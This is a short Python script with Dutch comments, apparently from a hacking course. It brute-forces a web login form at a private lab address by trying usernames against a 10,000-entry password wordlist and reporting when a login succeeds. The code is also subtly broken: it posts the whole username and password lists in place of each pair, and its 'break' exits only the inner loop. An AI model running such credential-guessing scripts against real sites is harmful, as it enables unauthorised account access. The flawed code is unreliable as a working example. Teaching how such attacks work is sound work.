import requests

# Welke webpagina 'forcen'. Opgelet: Dit is niet de inlogpagina zelf.
URL = "http://172.16.1.37:8888/" 

# Wat is de gebruikersnaam (Moet in lijst staan!)
users = ["administratie"] # gebruikersnaam bekend? Vul hier aan.

""" Is de naam onbekend? Dan kan je dit gebruiken in plaats van bovenstaande.
with open("10000-common-usernames.txt", "r") as lines:
    users = [line.strip() for line in lines]
"""


# Wat is het wachtwoord (Moet in lijst staan!)
# passwords = ["VUL AAN"] # Wachtwoord bekend? Vul hier aan.

""" Is het wachtwoord onbekend? Dan kan je dit gebruiken in plaats van bovenstaande."""
with open("hfst_7_hacken/10000-password-seclist.txt", "r") as lines:
    passwords = [line.strip() for line in lines]

# Overloop alle opties.
for user in users:
    for password in passwords:
        # Zet data klaar om te posten
        data = {'employee_id':users, 'password':passwords, "Login":'submit'}

        # Verzend POST request
        response = requests.post(URL, data=data)
        print(response.text)

        # Controleer of login geslaagd is (OBV inhoud webpagina)
        if "Incorrect Employee ID or Password." in response.text:
            print(f"Incorrecte Combinatie. Naam:{user} Wachtwoord:{password}.")
        else:
            print(f"Je bent binnen! Naam:{user} Wachtwoord:{password}")
            break